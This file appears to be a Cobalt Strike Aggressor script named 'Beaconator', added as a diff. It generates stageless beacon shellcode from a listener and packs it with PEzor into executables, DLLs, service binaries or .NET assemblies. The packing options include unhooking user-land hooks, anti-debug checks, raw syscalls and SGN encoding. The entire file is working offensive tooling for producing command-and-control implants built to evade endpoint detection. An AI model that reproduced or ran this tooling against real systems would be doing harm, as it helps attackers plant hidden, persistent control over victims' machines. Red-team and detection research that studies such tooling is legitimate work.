@@ -1,0 +1,145 @@
+# Beaconator: A beacon generator using Cobalt Strike and PEzor.
+# Author: @captmeelo
+# Version: 1.0
+# Blog: https://captmeelo.com/
+# GitHub: https://github.com/capt-meelo
+
+# Working directory
+$BUILD_DIR = "/output";
+
+menubar("Beaconator", "beaconator");
+
+popup beaconator {
+    item "Generate Beacon" {
+        runBeaconator();
+    }
+}
+
+sub runBeaconator {
+	$dialog = dialog("Beacon Generator", %(listener => "Select Listener", arch => "x64"), &generateBeacon);
+	dialog_description($dialog, "Generate a raw stageless shellcode using Cobalt Strike, then pack the generated shellcode with PEzor.");
+	drow_listener_stage($dialog, "listener", "Listener:");
+    drow_combobox($dialog, "arch", "Architecture:", @("x86", "x64"));
+    drow_checkbox($dialog, "hooks", "Hooks:", "Remove user-land hooks");
+	drow_checkbox($dialog, "antidebug", "Anti-debug:", "Add anti-debug checks");
+    drow_checkbox($dialog, "syscalls", "Raw Syscalls:", "Use raw syscalls (x64 and Win10 Only)");
+    drow_checkbox($dialog, "sgn", "SGN:", "Encode the provided shellcode with SGN");
+    drow_checkbox($dialog, "text", "Text Section:", "Store shellcode in .text section instead of .data");
+    drow_checkbox($dialog, "rx", "RX Memory:", "Allocate RX memory for shellcode (not compatible with -sgn)");
+    drow_checkbox($dialog, "self", "Self:", "Execute shellcode in the same thread (requires RX shellcode)");
+    drow_combobox($dialog, "format", "Output Format: ", @("exe", "dll", "reflective-dll", "service-exe", "service-dll", "dotnet", "dotnet-createsection", "dotnet-pinvoke"));
+    dbutton_action($dialog, "Generate");
+    dbutton_help($dialog, "https://github.com/phra/PEzor/blob/master/README.md#pezor-shellcode");
+	dialog_show($dialog);
+}
+
+sub generateBeacon {
+    ### Set the variables ###
+    # Set the architecture
+    $arch = $3['arch'];
+
+    # Set the architecture using PEzor's format
+    if ($3['arch'] eq "x86") {
+        $arch_pezor = "-32";
+    } else {
+        $arch_pezor = "-64";
+    }
+
+    # Set the user-land hooking option
+    if ($3['hooks'] eq "true") {
+        $hooks = "-unhook";
+    }
+    
+    # Set the antidebug option
+    if ($3['antidebug'] eq "true") {
+        $antidebug = "-antidebug";
+    }
+
+    # Set the syscalls option
+    if ($3['syscalls'] eq "true") {
+        $syscalls = "-syscalls";
+    }
+
+    # Set the sgn option
+    if ($3['sgn'] eq "true") {
+        $sgn = "-sgn";
+    }
+
+    # Set the text option
+    if ($3['text'] eq "true") {
+        $text = "-text";
+    }
+
+    # Set the rx option
+    if ($3['rx'] eq "true") {
+        $rx = "-rx";
+    }
+
+    # Set the self option
+    if ($3['self'] eq "true") {
+        $self = "-self";
+    }
+
+    # Set the output format
+    $format = $3['format'];
+
+
+    ### Error checks ###
+    # Show error prompt if no listener was selected
+	if (($3['listener'] ismatch "Select Listener")) {
+		show_message("ERROR: No listener was selected. Please select a listener.");
+		break;
+	}
+
+    # Error if syscalls are use with x86
+    if (($arch eq "-32") && (($syscalls eq "-syscalls"))) {
+        show_message("ERROR: Cannot inline syscalls with 32bits applications.");
+		break;
+    }
+
+    # Error if rx are encoded with sgn
+    if (($rx eq "-rx") && (($sgn eq "-sgn"))) {
+        show_message("ERROR: Cannot encode the shellcode when self-executing the payload.");
+		break;
+    }
+
+    # Error if syscalls are user with dotnet
+    if (('dotnet*' iswm $format) && (($syscalls eq "-syscalls"))) {
+        show_message("ERROR: Cannot inline syscalls when targeting .NET.");
+		break;
+    }
+
+
+    ### Generate the shellcode and beacon ###
+    # Create the shellcode based on the listener, architecture, and use "process" as the exit method
+    println("\c5[*] Generating shellcode...");
+    $shellcode = payload($3['listener'], $arch, "process");
+
+    # Write shellcode to a file
+    $handle = openf(">" .script_resource($BUILD_DIR). "/shellcode.bin");
+    writeb($handle, $shellcode);
+    closef($handle);
+    println("\c9[+] Successfully generated shellcode " .script_resource($BUILD_DIR). "/shellcode.bin");
+
+    # Generate the beacon (forcing shellcode detection w/ -shellcode option)
+    @command = @("PEzor.sh", "$arch_pezor", "$hooks", "$antidebug", "$syscalls", "$sgn", "$text", "$rx", "$self", "-shellcode", "-format=$format", script_resource($BUILD_DIR)."/shellcode.bin");
+    
+    # Remove empty param values to prevent insertion of additional whitespaces which breaks the -sgn option
+    remove(@command, $null);
+
+    # Print the PEzor commands to be executed
+    print("\c5[*] Executing:");
+    foreach $param (@command) {
+        print(" " . $param);
+    }
+    
+    # Execute commands
+    $process = exec(@command, $null, script_resource($BUILD_DIR));
+    @data = readAll($process);
+    printAll(@data);
+    closef($process);
+
+    # Show message
+    println("\c9[+] Success! Generated beacon can be found at " . script_resource($BUILD_DIR). ".");
+    show_message("Success! Generated beacon can be found at " . script_resource($BUILD_DIR). ".");
+}
